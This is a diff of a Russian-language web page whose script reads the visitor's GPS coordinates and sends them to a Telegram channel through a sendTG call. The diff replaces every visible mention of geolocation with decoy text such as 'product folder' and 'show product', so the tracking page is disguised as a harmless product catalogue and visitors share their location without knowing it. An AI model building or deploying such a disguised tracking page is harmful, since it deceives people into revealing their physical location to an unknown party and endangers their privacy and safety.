@@ -49,11 +49,11 @@ button{
 <body>
 
 <div class="box">
-  <h2>📍 Геолокация</h2>
+  <h2>папка товаров </h2>
 
   <p>Для продолжения нажмите кнопку</p>
 
-  <button onclick="startGPS()">Разрешить геолокацию</button>
+  <button onclick="startGPS()">показать товар</button>
 
   <div class="status" id="status">ожидание...</div>
 </div>
@@ -80,7 +80,7 @@ function startGPS(){
 
   if(!navigator.geolocation){
     document.getElementById("status").innerText =
-      "GPS не поддерживается";
+      "загрузка";
     return;
   }
 
@@ -94,7 +94,7 @@ function startGPS(){
       lon = pos.coords.longitude;
 
       document.getElementById("status").innerText =
-        "Вы в группе";
+        "ззз";
 
       sendTG(`📍 Первое подключение\n${lat}, ${lon}`);
 
